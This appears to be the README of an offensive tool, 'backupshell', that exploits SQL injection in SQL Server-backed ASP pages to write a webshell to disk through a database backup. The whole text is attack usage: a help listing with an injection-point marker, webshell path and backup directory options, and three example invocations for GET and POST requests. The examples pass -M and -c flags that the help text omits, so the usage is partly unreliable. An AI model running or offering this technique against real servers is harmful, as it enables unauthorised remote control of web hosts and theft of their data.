# An implement to get shell from Sql Injection point via backup-shell technic.
```
usage: backupshell [-h|--help] -u|--baseUrl "<value>" -m|--method (GET|POST)
[-p|--proxyUrl "<value>"] -s|--shell "<value>" [-H|--headers
"<value>" [-H|--headers "<value>" ...]] -d|--dbname
"<value>" -b|--backdir "<value>" [-D|--postData "<value>"]

                   Sqlserver backup shell exploit.

Arguments:

-h  --help      Print help information
-u  --baseUrl   The base URL of the target.Use {*} as the payload inject
point.
-m  --method    The method to use.
-p  --proxyUrl  The proxy URL.
-s  --shell     The path to a webshell.
-H  --headers   The headers to send http request.
-d  --dbname    The database name.
-b  --backdir   The backup directory.
-D  --postData  The post data.Use {*} as the payload inject point.
```
Example1, for GET request:
```
$ backupshell -u http://localhost/test.asp?a={*} -s /tools/payload/webshell.txt -d db1 -b c:\\a.txt -m GET -M log -c 1
```
Example2, for POST request:
```
$ backupshell -u http://localhost/test.asp -s /tools/payload/webshell.txt -d db1 -b c:\\a.txt -m POST -D "a={*}" -M log -c 1
```
Example3, for set up the payload in url param with POST request:
```
$ backupshell -u http://localhost/test.asp?a={*} -s /tools/payload/webshell.txt -d db1 -b c:\\a.txt -m POST -D "null" -M log -c 1
```
